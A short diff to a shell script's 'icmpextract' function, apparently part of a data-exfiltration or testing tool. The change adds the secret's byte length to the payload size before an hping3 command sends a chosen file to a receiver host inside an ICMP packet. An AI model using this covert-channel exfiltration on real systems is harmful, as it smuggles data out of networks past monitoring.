@@ -482,6 +482,9 @@ icmpextract()
   echo "What is your secret sign? (needs to be same on both ends)"
   read -i $SECRET -e SECRET
   SIZE=$(ls -l $EXTRACT | cut -d ' ' -f 5)
+#calculate size to include length of secret in bytes
+  SECRETSIZE=$(printf "%s" "$SECRET" |wc -c)
+  SIZE=$(expr $SIZE + $SECRETSIZE)
   echo "Starting extraction.."
   sudo hping3 $RECEIVER --icmp \
   --sign $SECRET -d $SIZE -c 1 --file $EXTRACT
